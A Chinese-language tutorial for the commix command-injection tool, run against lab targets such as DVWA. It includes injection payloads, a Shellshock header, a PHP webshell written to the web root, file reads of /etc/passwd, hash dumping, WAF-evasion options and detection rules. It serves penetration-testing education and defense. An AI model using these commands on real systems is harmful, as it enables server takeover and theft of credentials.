# commix（自动化 OS 命令注入检测与利用）

> **一句话**：自动发现 Web 应用里的操作系统命令注入漏洞，并利用它执行系统命令、读写文件、拿交互式 shell。
> **分类**：Web 应用 ｜ **Kali 包**：`commix` ｜ **官方文档**：<https://commixproject.com/>

## 1. 它解决什么问题

命令注入是**危害最高的 Web 漏洞之一**——一旦成功，攻击者直接在服务器上执行系统命令，通常等于直接拿到服务器控制权。

但手工测试很麻烦，因为注入点有无数种形态：

```text
; whoami        （命令分隔）
| whoami        （管道）
&& whoami       （逻辑与）
|| whoami       （逻辑或）
`whoami`        （反引号）
$(whoami)       （命令替换）
%0awhoami       （换行绕过）
```

而且**回显可能被过滤**（盲注），需要靠时间延迟或写文件来确认。commix 把这些都自动化了。

| 工具 | 定位 |
|------|------|
| **commix** | 命令注入的**一站式自动化**（检测 4 种技术 + 利用 + 后渗透） |
| [sqlmap](sqlmap.md) | SQL 注入的对应工具 |
| [ffuf](ffuf.md) / [wfuzz](wfuzz.md) | 参数 fuzz，能**发现**异常但不会判断是不是命令注入 |
| [nuclei](../02-漏洞分析/nuclei.md) | 用模板做快速判断（如 Shellshock 模板） |
| Burp + 手工 | 最灵活，适合复杂上下文 |

**分工**：用 [ffuf](ffuf.md) 筛可疑参数 → commix 自动检测与利用。commix 的检测阶段会发**很多**请求，噪声不小。

## 2. 工作原理

```text
   commix -u "http://target/ping.php?ip=127.0.0.1"
        │
   ┌────┴───────────────────────────────────────────────────────────┐
   │ ① 启发式检测（heuristic）                                       │
   │    - 探测目标 OS（Unix/Windows）                                │
   │    - 探测 WAF/IPS/IDS（--skip-waf 可跳过）                       │
   │    - 对参数值做数学运算注入（如 `echo $((7*7))`），              │
   │      看响应里有没有出现 49 —— 这是"经典注入"的快速判据           │
   └────┬───────────────────────────────────────────────────────────┘
        │
   ┌────┴───────────────────────────────────────────────────────────┐
   │ ② 按技术逐个测试（--technique，默认全部 CETF）                    │
   │                                                                 │
   │   C  Classic（结果回显）                                         │
   │      命令输出直接出现在 HTTP 响应里                              │
   │      → 最理想的情况，可交互式执行任意命令                        │
   │                                                                 │
   │   E  Dynamic Code Evaluation（动态代码求值）                     │
   │      目标是 eval() / assert() / preg_replace(/e) 这类函数         │
   │      注入的是 PHP/其他语言的表达式而非 shell 命令                │
   │                                                                 │
   │   T  Time-based（时间盲注）                                      │
   │      输出被过滤时，用 sleep 之类的延迟判断                       │
   │      → 最慢，但适用范围最广                                      │
   │                                                                 │
   │   F  File-based（文件型半盲注）                                  │
   │      把命令输出写到服务器上的文件，再通过 Web 读回来             │
   │      → 需要可写目录                                              │
   └────┬───────────────────────────────────────────────────────────┘
        │
   ┌────┴───────────────────────────────────────────────────────────┐
   │ ③ 确认注入点后进入交互式会话（默认行为）                          │
   │    可以执行：                                                    │
   │      os shell 命令（直接敲 `whoami`）                            │
   │      内置命令（`help` 查看）                                     │
   │    或直接用参数一次性执行：                                       │
   │      --os-cmd="id"  --file-read=/etc/passwd                     │
   │      --file-write=x --file-dest=/tmp/x                          │
   └────┬───────────────────────────────────────────────────────────┘
        │
   ┌────┴───────────────────────────────────────────────────────────┐
   │ ④ 枚举与后渗透（可自动执行）                                      │
   │    --current-user --hostname --is-root/--is-admin                │
   │    --sys-info --users --passwords --privileges --ps-version      │
   │    --msf-path=<path> → 与 Metasploit 集成，可进一步接管           │
   └────────────────────────────────────────────────────────────────┘
```

几个关键机制：

- **`--level` 控制测试位置**（和 sqlmap 类似）：
  - `1`：只测 URL 参数与 POST 数据（默认）
  - `2`：加上 **Cookie**
  - `3`：再加上 **HTTP 头**（`User-Agent`、`Referer`、`Host`）
  - **很多命令注入其实藏在 Cookie 或 User-Agent 里**（常见的日志分析功能），所以 `--level 3` 常能挖到意外收获。
- **`--technique` 是最重要的提速参数**：如果确定有回显，`--technique=c` 会快得多；如果输出被过滤，就只剩 `t`（时间）和 `f`（文件）可用。
- **`--tamper` 脚本**用于绕过 WAF/过滤（`--list-tampers` 查看全部）。
- **Shellshock 模块**：`--shellshock` 专门测 CVE-2014-6271——把 payload 放在 HTTP 头里攻击依赖 Bash 的 CGI 脚本。这是一类特殊的"命令注入"，commix 单独做了模块。
- **会话文件**：commix 把结果存进 `.sqlite`，`--flush-session` 从头再来，`--ignore-session` 复验但不丢历史。

## 3. 安装与快速上手

```bash
sudo apt install commix
commix --version
commix --help | head -40
```

最小可用命令：

```bash
# 1) 最基础：直接指定带参数的 URL
commix -u "http://192.168.56.101/vulnerabilities/exec/?ip=127.0.0.1&Submit=Submit"

# 2) POST 数据
commix -u http://target/login.php -d "user=admin&pass=test"

# 3) 批量（非交互，适合自动化）
commix -m targets.txt --batch --time-limit 300
```

> ⚠️ **只在有明确授权的目标上使用 commix。** 它能执行任意系统命令——在生产环境上误用可能造成不可逆的损害。Kali 的 commix 依赖 `metasploit-framework`，安装时会一并拉取。

## 4. 核心参数详解

### 通用

| 参数 | 作用 | 建议 |
|------|------|------|
| `-h, --help` | 帮助 | — |
| `-v <0-4>` | 详细级别（默认 0）：1 基本调试；2 所有 HTTP 请求；3 加响应头；4 完整请求/响应体 | 排障用 3~4 |
| `--version` | 版本 | — |
| `--install` | 系统级安装（需管理员权限） | — |
| `--update` | 检查并应用更新（需 git clone 安装） | — |
| `--output-dir=<dir>` | 自定义输出目录（不存在会创建） | 项目隔离 |
| `-s <session.sqlite>` | 从会话文件加载 | 继续之前的任务 |
| `--flush-session` | 清空当前目标的会话，强制全新扫描 | 换了参数后 |
| `--ignore-session` | 忽略会话里的结果但**不删除** | 复验用 |
| `-t <traffic.txt>` | 把所有 HTTP 流量记到文件 | **留证据** |
| `--time-limit=<sec>` | 最长运行时间（如 `3600`） | **自动化/CI 必设** |
| `--batch` | 从不询问用户，用默认行为 | **脚本化必加** |
| `--skip-heuristics` | 跳过代码注入的启发式检测 | 想加快或启发式误判时 |
| `--codec=<codec>` | 强制字符编码（如 `ascii`） | 编码问题 |
| `--charset=<charset>` | 时间型注入用的字符集（如 `0123456789abcdef`） | 绕过字符过滤 |
| `--check-internet` | 扫描前检查网络连通性 | — |
| `--answers=<a=b,...>` | 预设交互答案（如 `quit=N,follow=N`） | 精细的自动化控制 |

### 目标

| 参数 | 作用 | 建议 |
|------|------|------|
| `-u, --url=<url>` | 目标 URL | 最常用 |
| `--url-reload` | 每次命令执行后重新加载 URL | 应用状态会变时 |
| `-l <logfile>` | 从 HTTP 代理日志解析目标 | **配合 Burp 日志** |
| `-m <bulkfile>` | 从文件批量扫描多个目标 | 批量作业 |
| `-r <requestfile>` | 从文件读**原始 HTTP 请求** | **实战首选**（免手工复制头） |
| `--crawl=<depth>` | 从目标 URL 开始爬站（默认 1） | 自动发现注入点 |
| `--crawl-exclude=<re>` | 排除某些页面的正则（如 `logout`） | 防止爬出会话 |
| `-x <sitemap.xml>` | 从远端 sitemap 解析目标 | — |
| `--method=<method>` | 强制 HTTP 方法（如 `PUT`） | RESTful API |

### 请求构造

| 参数 | 作用 | 建议 |
|------|------|------|
| `-d, --data=<data>` | POST 数据（**给了就自动从 GET 切到 POST**） | — |
| `--host=<h>` | Host 头（`--level 3` 时才测） | Host 头注入 |
| `--referer=<r>` | Referer 头（`--level 3` 时才测） | 日志型注入点 |
| `--user-agent=<ua>` | User-Agent（`--level 3` 时才测） | — |
| `--random-agent` | 随机 UA（内置列表） | 绕过简单 WAF/CDN |
| `--mobile` | 模拟手机 UA | 移动端接口 |
| `--param-del=<c>` | 参数分隔符（默认 `&`） | — |
| `--cookie=<c>` | Cookie（如 `k1=v1; k2=v2`） | 会话 |
| `--cookie-del=<c>` | Cookie 分隔符（默认 `;`） | — |
| `--http1.0` | 强制 HTTP/1.0 | 老服务器 |
| `-H, --header=<h>` | 单个额外头（如 `X-Forwarded-For: 127.0.0.1`） | 多个用 `--headers` |
| `--headers=<hs>` | 多个额外头，用 `\n` 分隔 | — |
| `--proxy=<p>` | HTTP 代理（SOCKS 请用 proxychains） | 配 Burp |
| `--tor` / `--tor-port=<p>` | 走 Tor（默认端口 8118；原生 SOCKS 是 9050） | — |
| `--auth-url` / `--auth-data` | 登录面板 URL / 登录参数 | **自动化登录** |
| `--auth-type` / `--auth-cred` | HTTP 认证类型（Basic/Digest/Bearer）与凭据 | — |
| `--abort-code=<codes>` | 遇到这些状态码就中止（如 `401,403`） | — |
| `--ignore-code=<codes>` | 忽略这些状态码 | — |
| `--force-ssl` | 强制 HTTPS | — |
| `--ignore-proxy` / `--ignore-redirects` | 忽略系统代理 / 忽略重定向 | — |
| `--timeout=<sec>` | 连接超时（默认 30） | — |
| `--retries=<n>` | 超时重试次数（默认 3） | — |
| `--drop-set-cookie` | 忽略响应里的 `Set-Cookie` | 保持会话稳定 |

### 注入技术

| 参数 | 作用 | 建议 |
|------|------|------|
| `-p <param>` | 只测指定参数（多个用逗号分隔） | **提速最有效** |
| `--skip=<param>` | 跳过指定参数 | — |
| `--prefix=<s>` / `--suffix=<s>` | 给 payload 加前缀/后缀（闭合引号或语法结构） | 复杂上下文必用 |
| `--technique=<C\|E\|T\|F>` | 只用指定技术，可组合（如 `ctf`） | **有回显就用 `c`** |
| `--skip-technique=<T>` | 跳过指定技术（如 `tf`） | — |
| `--maxlen=<n>` | 时间型注入的输出最大长度（默认 10000 字符） | — |
| `--delay=<sec>` | 每个 HTTP 请求之间的延迟 | **限速/规避 WAF** |
| `--time-sec=<sec>` | 时间型技术里 OS 响应延迟秒数（默认 1） | 网络抖动大时调大 |
| `--tmp-path=<path>` | Web 服务器的临时目录绝对路径 | 文件型技术需要 |
| `--web-root=<path>` | Web 服务器文档根目录（如 `/var/www`） | 写 WebShell 时 |
| `--alter-shell=<shell>` | 使用替代 shell（如 `Python`） | 默认 shell 受限时 |
| `--os-cmd=<cmd>` | 执行**单条** OS 命令并显示输出 | 非交互式用法 |
| `--os=<OS>` | 强制后端 OS（`Windows` / `Unix`） | 覆盖自动识别 |
| `--tamper=<script>` | 用篡改脚本绕过过滤 | `--list-tampers` 查看 |
| `--msf-path=<path>` | Metasploit 安装路径 | 启用 MSF 集成与后渗透 |

### 枚举（在确认注入后自动执行）

| 参数 | 作用 |
|------|------|
| `--all` | 取回全部信息 |
| `--current-user` | 当前用户名 |
| `--hostname` | 主机名 |
| `--is-root` | 是否 root（Unix/Linux） |
| `--is-admin` | 是否管理员（Windows） |
| `--sys-info` | 系统信息（OS 版本、内核、架构） |
| `--users` | 系统用户列表 |
| `--passwords` | 用户口令哈希 |
| `--privileges` | 用户权限 |
| `--ps-version` | PowerShell 版本号（Windows） |

### 文件访问

| 参数 | 作用 | 建议 |
|------|------|------|
| `--file-read=<path>` | 读取目标主机上的文件（如 `/etc/passwd`） | — |
| `--file-write=<local>` | 把**本地文件**写到目标主机（配合 `--file-dest`） | 写 WebShell |
| `--file-dest=<path>` | 目标的绝对写入路径 | — |

### 检测与杂项

| 参数 | 作用 | 建议 |
|------|------|------|
| `--level=<1-3>` | 测试深度（默认 1）：1=URL/POST；2=+Cookie；3=+HTTP 头 | **`--level 3` 常能挖到意外注入点** |
| `--skip-calc` | 跳过检测阶段的数学计算 | — |
| `--skip-empty` | 跳过空值参数 | — |
| `--failed-tries=<n>` | 文件型技术的失败重试上限 | — |
| `--smart` | 只在启发式有正面证据时才做深入测试 | **减少误报与耗时** |
| `--shellshock` | 启用 Shellshock（CVE-2014-6271）模块 | 测 CGI 脚本 |
| `--ignore-dependencies` | 忽略第三方库依赖 | 慎用 |
| `--list-tampers` | 列出所有 tamper 脚本 | — |
| `--alert=<cmd>` | **本地**执行命令（发现注入点时触发） | 自动化告警 |
| `--no-logging` | 关闭文件日志，只在控制台显示 | — |
| `--purge` | 安全清除 commix 数据目录（缓存/会话/日志） | — |
| `--skip-waf` | 跳过 WAF/IPS/IDS 的启发式检测 | — |
| `--offline` | 离线模式（禁用更新检查） | 隔离环境 |
| `--wizard` | 向导界面 | 新手 |
| `--disable-coloring` | 关闭颜色 | 日志/无颜色终端 |

## 5. 实战演练

**环境**：本地实验环境。

- **DVWA**（Command Injection 模块）：`http://192.168.56.102:8080/vulnerabilities/exec/`
- **Juice Shop**（有 SSTI，但可练习参数 fuzz 的思路）
- **bWAPP / Metasploitable2** 的内置靶场
- 攻击机 Kali：`192.168.56.10`

> ⚠️ commix 会在目标上**真实执行系统命令**。只对授权靶场使用。

### 场景 1：DVWA 低安全级别——检测并拿到 shell

**前置准备**：浏览器登录 DVWA，安全级别设为 `low`，进入 Command Injection 页面，URL 与 Cookie：

```text
http://192.168.56.102:8080/vulnerabilities/exec/?ip=127.0.0.1&Submit=Submit
Cookie: PHPSESSID=abc123; security=low
```

```bash
commix -u "http://192.168.56.102:8080/vulnerabilities/exec/?ip=127.0.0.1&Submit=Submit" \
       --cookie="PHPSESSID=abc123; security=low" \
       -p ip --batch --level 2
```

预期输出片段：

```text
    __
   /__)
  /     )_
 (____(___)

        Commix v4.1

[+] Testing connection to the target URL... OK
[+] Checking if the target is protected by some kind of WAF/IPS... No
[+] Heuristic (basic) test shows that GET parameter 'ip' might be injectable (possible OS: Unix).
[+] Performing the injection tests...
[+] The (GET) 'ip' parameter seems to be vulnerable to Classid OS command injection.

    Type: results-based (Classic) injection
    Payload: ip=127.0.0.1;echo ERYEE$(echo HPPJY)$(echo YLGXA)

[+] The following techniques were used: 'C' (Classic)
[+] The 'ip' parameter is vulnerable to OS command injection.

    Do you want to prompt for a fake shell (pseudo-terminal)? [y/N] > N
    Do you want to enable data fetching with a custom payload? [y/N] > N
    Do you want to proceed with the enumeration of the system? [y/N] > N
```

解读：
- **`Heuristic (basic) test shows that GET parameter 'ip' might be injectable (possible OS: Unix)`** —— 启发式阶段就给出了强烈信号。
- **`Type: results-based (Classic) injection`** —— 这是最好的情况：命令输出直接回显，后续可以交互式执行任意命令。
- `Payload` 显示了实际的注入载荷（用拼接随机字符串的方式验证"命令确实被执行了"）。
- `--batch` 让所有交互式提问（要不要开伪终端、要不要枚举）都走默认值。

**交互式执行命令**（去掉 `--batch`，在提示处回答 `y`）：

```text
> whoami
www-data

> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

> uname -a
Linux dvwa 6.1.0 #1 SMP x86_64 GNU/Linux

> pwd
/var/www/html/vulnerabilities/exec

> ls -la ..
```

### 场景 2：非交互式——一次性执行命令 + 收集系统信息

```bash
commix -u "http://192.168.56.102:8080/vulnerabilities/exec/?ip=127.0.0.1&Submit=Submit" \
       --cookie="PHPSESSID=abc123; security=low" \
       -p ip --batch --technique=c \
       --os-cmd="id" \
       --current-user --hostname --sys-info --is-root \
       --output-dir=/lab/commix_dvwa
```

预期输出片段：

```text
[+] The (GET) 'ip' parameter seems to be vulnerable to Classid OS command injection.
[+] Execution command: 'id'
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

[+] Current user: 'www-data'
[+] Hostname: 'dvwa'
[+] Operating system: 'Linux dvwa 6.1.0 ...'
[+] The current user has no root privileges.
```

解读：`--technique=c` 指定只用经典（回显）技术，跳过耗时的盲注测试——**已知有回显时这是最重要的提速手段**。`--output-dir` 把所有结果集中存到一个目录，方便归档。

### 场景 3：从 Burp 导出请求（最实用）+ 提高测试深度

```bash
# 从 Burp 复制原始请求到 req.txt
cat req.txt
#   GET /dvwa/vulnerabilities/exec/?ip=127.0.0.1&Submit=Submit HTTP/1.1
#   Host: 192.168.56.102:8080
#   Cookie: PHPSESSID=abc123; security=low
#   User-Agent: Mozilla/5.0 ...

commix -r req.txt --batch --level 3 --smart --output-dir=/lab/commix_req
```

解读：
- **`-r` 免去了手工复制 Cookie 和所有头**——排查复杂请求时这是唯一不痛苦的方式。
- **`--level 3` 会把 Cookie、`User-Agent`、`Referer`、`Host` 都作为候选注入点**。这非常关键：很多应用会把 `User-Agent` 写进日志、把 `Referer` 传给后端命令——**日志分析类功能是最常见的隐藏注入点**。
- `--smart` 只在启发式有正面证据时才做深入测试，减少误报与耗时。

### 场景 4：盲注（时间型）+ 文件型读写

```bash
# 输出被过滤时，用时间型技术
commix -u "http://target/page.php?id=1" --batch \
       --technique=t --time-sec=3 \
       --current-user --hostname

# 读取服务器文件
commix -u "http://target/page.php?id=1" --batch --technique=c \
       --file-read="/etc/passwd"
cat /lab/commix_output/*/etc_passwd 2>/dev/null | head

# 写文件（例如写一个 PHP WebShell）
echo '<?php system($_GET["c"]); ?>' > shell.php
commix -u "http://target/page.php?id=1" --batch \
       --file-write="shell.php" --file-dest="/var/www/html/shell.php" \
       --web-root="/var/www/html"
```

解读：
- `--technique=t`（时间盲注）**每次判断都要等 `--time-sec` 秒**，所以非常慢。`--time-sec=3` 是在"网络抖动容忍度"和"速度"之间的平衡。
- `--file-read` 依赖 Web 进程对目标文件的**读权限**（`www-data` 通常读得到 `/etc/passwd`，读不到 `/etc/shadow`）。
- `--file-write` + `--file-dest` + `--web-root` 是**写 WebShell 的标准组合**。写成功后就能通过浏览器访问该 WebShell，脱离 commix 继续操作。
- 手工验证写没写成功：

```bash
curl "http://target/shell.php?c=id"
```

### 场景 5：Shellshock（CVE-2014-6271）专项

```bash
# Shellshock 的注入点在 HTTP 头里，所以要用 --shellshock 模块
commix -u "http://192.168.56.101/cgi-bin/status" --shellshock --batch --level 3
```

预期输出片段：

```text
[+] Testing the target for Shellshock (CVE-2014-6271)...
[+] The target seems to be vulnerable to Shellshock.
[+] Payload: User-Agent: () { :; }; echo; echo; /bin/bash -c 'echo ...'
```

解读：Shellshock 的特殊之处在于 **payload 放在 `User-Agent`/`Referer`/`Cookie` 里**，攻击的是 CGI 脚本调用的 Bash。`--shellshock` 模块专门处理这个模式，需要配合 `--level 3`（否则不测 HTTP 头）。

### 场景 6：绕过过滤（tamper）与批量扫描

```bash
# 1) 查看可用的篡改脚本
commix --list-tampers

# 2) 用 tamper 绕过简单的关键字过滤
commix -u "http://target/?cmd=1" --batch \
       --tamper=space2plus,carets,quotes \
       --delay=1

# 3) 批量目标（每行一个 URL）
cat > targets.txt <<'EOF'
http://192.168.56.101/vuln.php?id=1
http://192.168.56.102/other.php?name=x
EOF
commix -m targets.txt --batch --time-limit 900 --output-dir=/lab/commix_batch

# 4) 从 Burp 的代理日志批量提取目标
commix -l /path/to/burp_proxy_history.log --batch --smart
```

解读：
- `--list-tampers` 列出所有篡改脚本（如 `space2plus`、`carets`、`quotes`、`base64`、`hex` 等）。
- `--delay=1` 在 WAF 环境下很关键——**限速能显著降低被拦的概率**。
- `-l`（从代理日志）是"把 Burp 抓到的所有请求一次性喂给 commix"的高效方式。
- `--time-limit` 是批量作业的安全阀。

## 6. 输出解读

### 检测阶段关键词

| 输出 | 含义 | 下一步 |
|------|------|--------|
| `Testing connection to the target URL... OK` | 连通性正常 | — |
| `Checking if the target is protected by some kind of WAF/IPS...` | WAF 探测 | 检测到 WAF 时考虑 `--tamper`、`--delay` |
| `Heuristic (basic) test shows that ... parameter '<p>' might be injectable (possible OS: Unix)` | 启发式疑似 | 继续看后续确认 |
| `The (GET/POST) '<p>' parameter seems to be vulnerable to Classid OS command injection` | **确认存在注入** | 记录 |
| `Type: results-based (Classic) injection` | 技术类型（4 种之一） | 回显型可直接交互 |
| `Payload: ...` | 实际注入载荷 | 报告取证 |
| `The following techniques were used: 'C'` | 实际生效的技术集合 | — |
| `parameter '<p>' is not injectable` | 该参数安全 | 换参数 / 提高 `--level` |
| `All parameters seem to be not injectable` | 全部无结果 | 提高 `--level`；检查 Cookie；`--technique` 收窄 |

### 四种技术（Type）对比

| 技术 | 判定依据 | 速度 | 可用场景 |
|------|---------|------|---------|
| `C` Classic | 命令输出出现在响应里 | **快** | 最理想 |
| `E` Dynamic Code Evaluation | 代码求值函数的响应差异 | 中 | `eval()`/`assert()`/`preg_replace/e` |
| `T` Time-based | 响应延迟 | **最慢** | 输出被过滤 |
| `F` File-based | 写文件后再读回 | 中 | 输出被过滤且可写目录 |

**优化顺序**：先试 `--technique=c`；不行再加 `e`；都不行才用 `t`/`f`。盲注会慢一个数量级。

### 枚举结果的含义

| 输出 | 含义 | 后续价值 |
|------|------|---------|
| `Current user: 'www-data'` | Web 进程身份 | 判断是否有提权空间 |
| `The current user has root privileges` | 已经是 root | **直接完成主机接管** |
| `Hostname: '...'` | 主机名 | 资产识别 |
| `Operating system: '...'` | 系统与内核版本 | 去 [searchsploit](../02-漏洞分析/searchsploit.md) 查提权 EXP |
| `Users: ...` / `Passwords: ...` | 系统用户与哈希 | 离线破解（授权内） |

## 7. 与其他工具配合

```bash
# 1) Burp 抓包 -> commix（标准流程）
#    Burp 右键 → Copy to file → req.txt
commix -r req.txt --batch --level 3 --smart --output-dir=/lab/commix_out

# 2) ffuf 筛参数 -> commix 验证
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u "http://target/page.php?FUZZ=1" -mc all -ac -s -o p.json -of json
jq -r '.results[].input.FUZZ' p.json | while read -r param; do
  commix -u "http://target/page.php?$param=1" --batch -p "$param" --smart
done

# 3) commix 拿到系统信息 -> searchsploit 找提权
commix -u "http://target/?id=1" --batch --sys-info --output-dir=/lab/c
grep -i "kernel" /lab/c/*/commix.log | head
searchsploit linux kernel 6.1

# 4) commix 写 WebShell -> 后续用其他工具
commix -u "http://target/?id=1" --batch --file-write=sh.php --file-dest=/var/www/html/sh.php
curl "http://target/sh.php?c=id"        # 验证
# 然后用这个 WebShell 做内网渗透（授权内）

# 5) commix -> Metasploit 集成
commix -u "http://target/?id=1" --batch --msf-path=/usr/share/metasploit-framework \
       --all
```

## 8. 常见坑与排错

| 现象 | 原因 | 解决 |
|------|------|------|
| `All parameters seem to be not injectable` | 参数确实安全 / 检测位置不够 | `--level 2`（测 Cookie）、`--level 3`（测 HTTP 头）；换 `-p` 指定其他参数 |
| 检测很慢 | 默认测 4 种技术 | `--technique=c`（有回显时）；`--smart` |
| 被 WAF 拦 | 请求特征明显 | `--tamper=<script>`、`--delay=1`、`--random-agent`；`--skip-waf` 只是跳过检测不是绕过 |
| 时间型注入一直失败 | `--time-sec` 太小，被网络抖动淹没 | 调大到 3~5；同时确认目标真的会延迟 |
| 交互式会话卡住/无法输入 | 目标没有回显（盲注） | **盲注无法开交互 shell**；改用 `--os-cmd` 一条条执行，或先 `--file-write` 写 WebShell |
| `--file-write` 失败 | 目标目录不可写/路径不对 | 用 `--web-root`、`--tmp-path` 指定路径；先 `--file-read` 确认可读目录；试 `/tmp` |
| `--file-read` 返回空 | 权限不足（如 `/etc/shadow`） | 换 `www-data` 能读的文件（`/etc/passwd`、应用配置） |
| Shellshock 模块没结果 | 没加 `--level 3`（不测 HTTP 头），或目标非 CGI | 加 `--level 3`；确认目标是 CGI 脚本 |
| 日志里有明文敏感数据 | 默认会记录完整流量 | `--no-logging`；或事后清理 `--purge` |
| 会话缓存导致重复结果 | 命中了 sqlite 会话 | `--flush-session`；或 `--ignore-session` 只复验 |
| 批量任务跑到天亮 | 无时长限制 | `--time-limit=<sec>` |
| `commix` 安装时报缺依赖 | 依赖 `metasploit-framework` | `sudo apt install -y commix`（会拉齐依赖） |
| 中文输出乱码 | 编码 | `--codec=utf-8` |

## 9. 防御视角（蓝队）

命令注入的**检测难度比 SQL 注入低**，因为 payload 里有非常明显的 shell 元字符。

### 检测特征

| 特征 | 说明 |
|------|------|
| **UA 默认值** | `commix/v4.1 (https://commixproject.com)`，可改 |
| **shell 元字符** | 请求里出现 `;`、`|`、`&&`、`||`、`` ` ``、`$(...)`、`%0a` 后跟命令名 |
| **常见命令词** | `whoami`、`id`、`uname`、`cat /etc/passwd`、`sleep`、`ping -c`、`curl`、`wget`、`nc` |
| **时间型特征** | 响应时间出现**规律性固定延迟**（与 `--time-sec` 一致） |
| **commix 的拼接验证载荷** | 响应里出现 `echo <随机串>$(echo <随机串>)` 这类结构 |
| **Shellshock 载荷** | 请求头里出现 `() { :; };` —— **这个字符串在正常流量里出现的概率为 0**，是极高置信度的检测点 |
| **文件型特征** | 短时间内先有写文件请求，紧接着对该文件发起 GET（写 WebShell 的模式） |

### 检测规则建议

```text
# 1) 最高置信度：Shellshock 特征
- 任意请求头匹配 \(\)\s*\{\s*:;\s*\};        # () { :; };
- UA 匹配 (?i)commix

# 2) shell 元字符 + 命令名组合
- (参数值|请求头) 匹配 [;|&`$]\s*(whoami|id|uname|cat\s+/etc/|sleep|ping|curl|wget|nc|bash|sh)\b

# 3) 时间型盲注：响应时间规律性延迟
- 同一参数在 60s 内出现 >= 5 次响应时间 ≈ 固定值（如 1s/3s/5s）

# 4) 写文件后立刻访问
- 先有 PUT/POST 写 *.php，随后短时间内对该 *.php 发起 GET 且带参数

# 5) 常见路径
- /cgi-bin/ 下的异常请求（Shellshock 高发区）
```

### 缓解措施（按优先级）

| 优先级 | 措施 | 说明 |
|--------|------|------|
| **最高** | **不把用户输入传给 shell** | **根因修复**：用参数化的 API（如 Python 的 `subprocess.run([...], shell=False)`、Java 的 `ProcessBuilder` 数组形式） |
| 高 | 必须调用外部命令时用**白名单** | 例如只允许 `ping`，并把参数严格限定为 IP 格式 |
| 高 | **禁用危险符号** | 对输入过滤/拒绝 `;|&$\`()` 与换行；但过滤是次优方案（易被绕过） |
| 高 | **禁用危险函数** | PHP：`disable_functions = system,exec,shell_exec,passthru,popen,proc_open`；禁用 `eval`、`preg_replace` 的 `/e` 修饰符 |
| 高 | **及时打 Shellshock 补丁** | Bash 升级到修复版本；非必要不使用 CGI |
| 中 | 最小权限运行 Web 进程 | `www-data` 不应有 shell（`/usr/sbin/nologin`）、不应能读敏感文件、不应能写 Web 根目录 |
| 中 | 容器化 + 只读文件系统 | 即使注入成功，能造成的破坏也有限（写不了 WebShell） |
| 中 | 出网限制 | 阻断反弹 shell 与下载二段载荷 |
| 中 | WAF 规则 | 拦 shell 元字符与常见命令词（提高成本） |
| 低 | 关闭不必要的 CGI | 减少 Shellshock 的攻击面 |

### 蓝队重点工作

1. **审计所有调用外部命令的代码**：搜索 `system(`、`exec(`、`shell_exec(`、`os.system`、`os.popen`、`subprocess.*(shell=True)`、`Runtime.exec`、反引号等。这是**唯一能根治的做法**。
2. **日志监控**：把 shell 元字符出现在参数值里设为告警——误报率很低，因为正常业务参数极少包含 `;`+命令名的组合。
3. **出站流量监控**：命令注入成功后，攻击者通常要下载载荷或建反弹 shell。**出站流量的异常**是发现"注入已成功"的关键信号，即使入站检测被绕过。

## 10. 参考

- 项目主页：<https://commixproject.com/>
- 官方仓库：<https://github.com/commixproject/commix>
- Kali 工具页：<https://www.kali.org/tools/commix/>
- CVE-2014-6271（Shellshock）说明：<https://nvd.nist.gov/vuln/detail/CVE-2014-6271>
- man page：`man commix`（内容完整，含全部选项与示例）
- 用法核实：本教程参数取自 `commix 4.1` 的 man page（已逐项核对选项名、取值与说明）

---

**相关教程**：[sqlmap](sqlmap.md) ｜ [ffuf](ffuf.md) ｜ [wfuzz](wfuzz.md) ｜ [wpscan](wpscan.md) ｜ [nuclei](../02-漏洞分析/nuclei.md) ｜ [searchsploit](../02-漏洞分析/searchsploit.md)
